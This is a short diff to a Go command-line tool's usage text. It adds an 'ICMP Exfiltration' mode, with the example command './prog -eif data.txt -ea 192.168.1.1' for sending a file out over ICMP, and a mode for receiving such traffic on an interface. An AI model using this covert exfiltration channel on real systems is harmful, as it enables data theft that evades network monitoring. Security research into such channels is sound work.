@@ -46,8 +46,14 @@ func main() {
 		fmt.Println("  Use '-t' followed by the number of runs and '-m' followed by the minutes multiplier to collect data over multiple runs.")
 		fmt.Printf("  Example: ./%s -t 5 -m 10\n", os.Args[0])
 		fmt.Println()
+		fmt.Println("Mode 3: ICMP Exfiltration (-eif and -ea)")
+		fmt.Println("  Use '-eif' followed by the file name and '-ea' followed by the address for ICMP exfiltration.")
+		fmt.Printf("  Example: ./%s -eif data.txt -ea 192.168.1.1\n", os.Args[0])
+		fmt.Println()
+		fmt.Println("Mode 4: Receive ICMP (-eii)")
+		fmt.Println("  Use '-eii' followed by the interface name for ICMP reception.")
+		fmt.Printf("  Example: ./%s -eii eth0\n", os.Args[0])
 		flag.PrintDefaults()
-
 	}
 }
 
